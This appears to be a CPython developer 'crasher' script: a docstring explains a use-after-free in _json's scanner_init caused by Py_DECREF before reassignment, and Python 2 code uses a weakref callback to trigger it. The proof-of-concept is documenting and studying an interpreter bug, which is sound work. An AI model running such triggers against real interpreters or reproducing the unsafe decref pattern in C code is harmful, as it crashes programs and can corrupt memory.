"""
General example for an attack against code like this:

    Py_DECREF(obj->attr); obj->attr = ...;

here in Module/_json.c:scanner_init().

Explanation: if the first Py_DECREF() calls either a __del__ or a
weakref callback, it will run while the 'obj' appears to have in
'obj->attr' still the old reference to the object, but not holding
the reference count any more.

Status: progress has been made replacing these cases, but there is an
infinite number of such cases.
"""

import _json, weakref

class Ctx1(object):
    encoding = "utf8"
    strict = None
    object_hook = None
    object_pairs_hook = None
    parse_float = None
    parse_int = None
    parse_constant = None

class Foo(unicode):
    pass

def delete_me(*args):
    print scanner.encoding.__dict__

class Ctx2(Ctx1):
    @property
    def encoding(self):
        global wref
        f = Foo("utf8")
        f.abc = globals()
        wref = weakref.ref(f, delete_me)
        return f

scanner = _json.make_scanner(Ctx1())
scanner.__init__(Ctx2())
